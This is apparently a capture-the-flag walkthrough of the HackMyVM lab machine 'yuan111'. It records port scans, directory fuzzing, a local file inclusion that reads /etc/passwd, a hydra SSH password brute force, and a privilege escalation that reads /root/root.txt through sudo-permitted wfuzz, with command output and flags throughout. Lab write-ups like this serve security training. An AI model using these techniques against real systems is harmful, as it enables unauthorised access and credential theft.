@@ -1,0 +1,171 @@
+Today we are going to start solving machine series from hackmyvm whose first cantoinment is yuan111.
+
+
+So as like other easy based machines from hackmyvm we have this machine and it's banner has it ip
+
+Main IP :: 192.168.56.118
+
+Starting enumeration with all port scan.
+
+Nmap scan report for 192.168.56.118
+Host is up (0.000071s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+MAC Address: 08:00:27:C1:11:36 (Oracle VirtualBox virtual NIC)
+
+We have found the open ports.
+
+Let's perform service and detection version scan.
+
+Nmap scan report for 192.168.56.118
+Host is up, received arp-response (0.00034s latency).
+Scanned at 2026-06-01 18:38:23 +1245 for 7s
+
+PORT   STATE SERVICE REASON         VERSION
+22/tcp open  ssh     syn-ack ttl 64 OpenSSH 8.4p1 Debian 5+deb11u3 (protocol 2.0)
+| ssh-hostkey: 
+|   3072 f6:a3:b6:78:c4:62:af:44:bb:1a:a0:0c:08:6b:98:f7 (RSA)
+| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDRmicDuAIhDTuUUa37WCIEK2z2F1aDUtiJpok20zMzkbe1B41ZvvydX3JHjf7mgl0F/HRQlGHiA23Il+dwr0YbbBa2ggd5gDl95RSHhuUff/DIC10OFbP3YU8A4ItFb8pR6dN8jr+zU1SZvfx6FWApSkTJmeLPq9PN889+ibvckJcOMqrm1Y05FW2VCWn8QRvwivnuW7iU51IVz7arFe8JShXOLu0ANNqZEXyJyWjaK+MqyOK6ZtoWdyinEQFua81+tBZuvS+qb+AG15/h5hBsS/tUgVk5SieY6cCRvkYFHB099e1ggrigfnN4Kq2GvzRUYkegjkPzJFQ7BhPyxT/kDKrlVcLX54sXrp0poU5R9SqSnnESXVM4HQfjIIjTrJFufc2nBF+4f8dH3qtQ+jJkcPEKNVSKKEDULEk1BSBdokhh1GidxQY7ok+hEb9/wPmo6RBeb1d5t11SP8R5UHyI/yucRpS2M8hpBaovJv8pX1VwpOz3tUDJWCpkB3K8HDk=
+|   256 bb:e8:a2:31:d4:05:a9:c9:31:ff:62:f6:32:84:21:9d (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBI2Hl4ZEYgnoDQflo03hI6346mXex6OPxHEjxDufHbkQZVosDPFwZttA8gloBLYLtvDVo9LZZwtv7F/EIiQoIHE=
+|   256 3b:ae:34:64:4f:a5:75:b9:4a:b9:81:f9:89:76:99:eb (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAILRLvZKpSJkETalR4sqzJOh8a4ivZ8wGt1HfdV3OMNY1
+80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.62 ((Debian))
+|_http-title: Rockyou.txt - \xE5\xAF\x86\xE7\xA0\x81\xE5\xAD\x97\xE5\x85\xB8\xE6\x96\x87\xE4\xBB\xB6\xE4\xBB\x8B\xE7\xBB\x8D
+|_http-server-header: Apache/2.4.62 (Debian)
+| http-methods: 
+|_  Supported Methods: POST OPTIONS HEAD GET
+MAC Address: 08:00:27:C1:11:36 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+
+Moving With the port 80 we will see the webpage that has password and about it's information and stuff let's 
+
+Start with directory and file fuzzing also will look deep into source page if there is something.
+
+
+ gobuster dir -u http://192.168.56.118/ -w /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt 
+===============================================================
+Gobuster v3.8.2
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.56.118/
+[+] Method:                  GET
+[+] Threads:                 10
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-large-files.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.8.2
+[+] Timeout:                 10s
+===============================================================
+Starting gobuster in directory enumeration mode
+===============================================================
+index.html           (Status: 200) [Size: 20592]
+.htaccess            (Status: 403) [Size: 279]
+.                    (Status: 200) [Size: 20592]
+.html                (Status: 403) [Size: 279]
+file.php             (Status: 200) [Size: 0]
+
+
+there is file.php and it's a blank page let's try to think if LFI is there
+
+http://192.168.56.118/file.php?file=/etc/passwd
+
+and with this above we can read the /etc/passwd file and in it's last line we can clear see the username
+
+sshd:/usr/sbin/nologin tao:x:1000:1000:,,,:/home/tao:/bin/bash 
+
+so let's brute force tao username's password with hydra.
+
+hydra -l tao -P /usr/share/wordlists/rockyou.txt ssh://192.168.56.118
+Hydra v9.6 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-06-01 18:45:42
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
+[DATA] attacking ssh://192.168.56.118:22/
+[22][ssh] host: 192.168.56.118   login: tao   password: rockyou
+
+And we can see this.
+
+ ls
+user.txt
+tao@111:~$ cat user.txt 
+flag{user-21747e1ca09bfcc4f2551263db0f3dff}
+tao@111:~$ 
+
+and here we are into the user file.
+
+
+
+TIME FOR PRIVILEGE ESCALATION::
+
+We will start with sudo -l;
+
+sudo -l
+Matching Defaults entries for tao on 111:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tao may run the following commands on 111:
+    (ALL) NOPASSWD: /usr/bin/wfuzz
+    (ALL) NOPASSWD: /usr/bin/id
+
+so as we can see that we can runn wfuzz to call what we actually need so we will the paramter that will check if this might work.
+
+ sudo -l
+Matching Defaults entries for tao on 111:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+
+User tao may run the following commands on 111:
+    (ALL) NOPASSWD: /usr/bin/wfuzz
+    (ALL) NOPASSWD: /usr/bin/id
+tao@111:~$ nano test.txt
+tao@111:~$ sudo /usr/bin/wfuzz -z file,test.txt http://localhost/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://localhost/FUZZ
+Total requests: 1
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000001:   404        9 L      31 W       271 Ch      "hello this side kabir"                             
+
+Total time: 0
+Processed Requests: 1
+Filtered Requests: 0
+Requests/sec.: 0
+
+tao@111:~$ cat test.txt 
+hello this side kabir
+
+
+so as you can see it fetched my test.txt from localhost it will definetly callout root.txt\
+
+
+ wfuzz -z file,/root/root.txt http://localhost/FUZZ
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://localhost/FUZZ
+Total requests: 1
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                             
+=====================================================================
+
+000000001:   404        9 L      31 W       271 Ch      "flag{root-9bbd7af2a042a901b92dc203b3896621}"       
+
+Total time: 0
+Processed Requests: 1
+Filtered Requests: 0
+Requests/sec.: 0
+
